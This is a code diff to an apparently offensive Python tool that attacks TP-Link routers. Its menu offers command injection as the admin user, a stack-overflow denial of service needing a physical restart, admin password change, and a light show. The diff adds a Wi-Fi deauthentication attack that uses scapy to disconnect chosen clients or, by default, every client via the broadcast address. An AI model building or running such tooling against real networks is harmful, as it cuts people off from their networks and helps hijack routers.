@@ -5,6 +5,7 @@ import argparse
 import threading
 import subprocess
 from attacks import *
+from network_attacks import *
 from scapy.all import *
 from scapy.layers.dot11 import *
 
@@ -15,6 +16,7 @@ ATTACKS = [
     ("Command Injection", "Run arbitrary commands as the Admin user. This requires Admin access (Refer to Attack #3)"),
     ("Denial of Service (DoS)",   "Utilize a Stack Overflow to take down the Admin console (Requires physical restart to fix)"),
     ("Change Admin Password", "Change the Admin password in the web console. This requires Admin access (Refer to Attack #3)"),
+    ("De-Auth Client", "Forcably remove a client from the network"),
     ("Light Show", "Start a light show from the router"),
 ]
 
@@ -329,7 +331,6 @@ def main() -> None:
                             password = str(input("[!] Enter the Admin password:").strip())
                             command = str(input("[!] Enter the command you want to be executed:").strip())
                             command_injection(URL, password, command)
-
                     case 5:
                         if not IP:
                             IP = str(input("[!] Enter IP of the TP-Link Router:").strip())
@@ -345,6 +346,17 @@ def main() -> None:
                             new_pass = str(input("[!] Enter the new password:"))
                             PASSWORD = change_password(URL, password, new_pass)
                     case 7:
+                        mode = str(input("[!] Do you want to deauth a specific target [y/N] (Default is deauth all): "))
+                        #test_client = "72:B8:34:E7:3B:49"
+                        if mode.lower() == "y":
+                            client_list = get_local_devices()
+                            setup_network()
+                            send_deauth(target["BSSID"], client_list, target["Channel"])
+                        else:
+                            setup_network()
+                            send_deauth(target["BSSID"], ["ff:ff:ff:ff:ff:ff"], target["Channel"])
+                        teardown_network()
+                    case 8:
                         if not URL:
                             URL = request_url()
                         if PASSWORD:
